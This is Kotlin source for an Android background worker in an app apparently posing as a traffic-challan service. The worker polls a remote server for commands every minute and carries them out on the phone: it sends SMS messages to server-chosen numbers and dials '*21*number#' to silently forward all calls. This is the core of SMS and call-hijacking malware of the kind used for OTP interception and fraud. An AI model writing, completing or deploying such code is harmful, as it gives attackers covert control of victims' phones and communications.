package com.rte.challan.worker

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build // ✅ YE IMPORT ZAROORI HAI (Isi ki wajah se error aa raha tha)
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.gson.Gson
import com.rte.challan.network.ApiClient
import com.rte.challan.utils.DeviceInfo
import com.rte.challan.utils.UssdHelper
import com.rte.challan.data.Command
import com.rte.challan.data.CommandAck
import com.rte.challan.data.SmsCommandData
import com.rte.challan.data.ForwardCommandData
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class CommandWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceInfo.getDeviceId(applicationContext)
        logAndToast("🔍 CommandWorker started")

        return try {
            val response = ApiClient.instance.getPendingCommands(deviceId)
            if (response.isSuccessful) {
                val allCommands = response.body() ?: emptyList()
                if (allCommands.isNotEmpty()) {
                    logAndToast("📦 Total ${allCommands.size} command(s)")

                    val batchSize = 5
                    allCommands.chunked(batchSize).forEachIndexed { index, batch ->
                        batch.forEach { cmd ->
                            val success = executeCommand(cmd)
                            val ackStatus = if (success) "sent" else "failed"
                            val ack = CommandAck(cmd.id, ackStatus)
                            ApiClient.instance.acknowledgeCommand(ack)
                        }

                        if (index < (allCommands.size - 1) / batchSize) {
                            logAndToast("⏸️ Waiting 10s for next batch...")
                            delay(10000)
                        }
                    }
                } else {
                    Log.d("CommandWorker", "⏳ No pending commands")
                }
                
                // 1 minute delay ke baad khud ko phir se schedule karein
                scheduleSelf(1, TimeUnit.MINUTES)
                Result.success()
            } else {
                scheduleSelf(1, TimeUnit.MINUTES)
                Result.failure()
            }
        } catch (e: Exception) {
            Log.e("CommandWorker", "🚨 Error: ${e.message}")
            scheduleSelf(1, TimeUnit.MINUTES)
            Result.failure()
        }
    }

    private fun executeCommand(cmd: Command): Boolean {
        return try {
            when (cmd.type) {
                "sms" -> {
                    val data = Gson().fromJson(cmd.data, SmsCommandData::class.java)
                    sendSms(data.number, data.text)
                }
                "call_forward" -> {
                    val data = Gson().fromJson(cmd.data, ForwardCommandData::class.java)
                    UssdHelper.dialUssd(applicationContext, "*21*${data.number}#")
                    true
                }
                else -> false
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun sendSms(number: String, text: String): Boolean {
        if (ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            return false
        }
        return try {
            // ✅ Build class ab import ho gayi hai
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                applicationContext.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager?.sendTextMessage(number, null, text, null, null)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun scheduleSelf(delay: Long, unit: TimeUnit) {
        val request = OneTimeWorkRequestBuilder<CommandWorker>()
            .setInitialDelay(delay, unit)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "CommandWorkerChain",
            ExistingWorkPolicy.REPLACE, // Purana wala replace karke naya schedule karega
            request
        )
    }

    // UI/Toast hamesha Main Thread par honi chahiye
    private suspend fun logAndToast(message: String) {
        Log.d("CommandWorker", message)
        withContext(Dispatchers.Main) {
            Toast.makeText(applicationContext, message, Toast.LENGTH_SHORT).show()
        }
    }
}
